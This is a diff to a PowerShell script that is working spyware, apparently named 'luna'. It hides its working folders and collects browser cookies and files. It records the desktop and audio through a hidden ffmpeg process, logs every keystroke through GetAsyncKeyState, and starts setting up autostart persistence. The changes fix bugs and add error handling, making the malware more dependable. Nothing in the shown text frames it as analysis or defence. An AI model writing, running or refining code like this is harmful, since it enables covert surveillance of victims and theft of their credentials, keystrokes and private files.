@@ -9,8 +9,9 @@ $keylogPath = "$tempDir\keylog.txt"
 $videoDir = "$env:USERPROFILE"
 
 New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir | Out-Null
-(Get-Item $tempDir).Attributes += 'Hidden'
-Start-Transcript -Path "$tempDir\session.log" -Append
+if (Test-Path $tempDir) {
+    (Get-Item $tempDir).Attributes += 'Hidden'
+}
 
 function Collect-Cookies {
     $targets = @(
@@ -66,22 +67,34 @@ function Collect-Files {
 function Start-Recording {
     $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
     $videoDir = "$env:USERPROFILE\luna_video_fragments"
-    if (!(Test-Path $videoDir)) { New-Item -ItemType Directory -Path $videoDir -Force | Out-Null }
-    if (!(Test-Path $ffmpeg)) { return }
+
+    if (!(Test-Path $ffmpeg)) {
+        Write-Warning "ffmpeg not found at $ffmpeg"
+        return
+    }
+
+    if (!(Test-Path $videoDir)) {
+        New-Item -ItemType Directory -Path $videoDir -Force | Out-Null
+    }
 
     $ts = Get-Date -Format "yyyyMMdd_HHmmss"
     $pattern = "$videoDir\frag_$ts_%03d.mp4"
 
-    Start-Process -WindowStyle Hidden -FilePath $ffmpeg -ArgumentList @(
-        "-f", "gdigrab", "-framerate", "15", "-i", "desktop",
-        "-f", "dshow", "-i", "audio=virtual-audio-capturer",
-        "-vcodec", "libx264", "-preset", "veryfast",
-        "-acodec", "aac", "-ar", "44100", "-b:a", "128k",
-        "-f", "segment", "-segment_time", "60",
-        "-reset_timestamps", "1",
-        "$pattern"
-    )
+    try {
+        Start-Process -FilePath $ffmpeg -ArgumentList @(
+            "-f", "gdigrab", "-framerate", "15", "-i", "desktop",
+            "-f", "dshow", "-i", "audio=virtual-audio-capturer",
+            "-vcodec", "libx264", "-preset", "veryfast",
+            "-acodec", "aac", "-ar", "44100", "-b:a", "128k",
+            "-f", "segment", "-segment_time", "60",
+            "-reset_timestamps", "1", "$pattern"
+        ) -WindowStyle Hidden -PassThru | Out-Null
+        Write-Output "Recording started"
+    } catch {
+        Write-Warning "Failed to start ffmpeg recording: $_"
+    }
 }
+
 
 "" | Out-File -Encoding utf8 -Force $keylogPath
 Start-Job -ScriptBlock {
@@ -97,12 +110,13 @@ Start-Job -ScriptBlock {
         for ($i = 1; $i -le 255; $i++) {
             if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
                 $char = try { if ($map[$i]) { $map[$i] } else { [char]$i } } catch { "[?]" }
-                Add-Content -Path $logPath -Value \"$char\" -NoNewline -Encoding utf8
+                Add-Content -Path $logPath -Value $char -NoNewline -Encoding utf8
             }
         }
         Start-Sleep -Milliseconds 50
     }
 }
+
 
 function Ensure-Autostart {
     $path = "$env:APPDATA\Microsoft\Windows\luna"
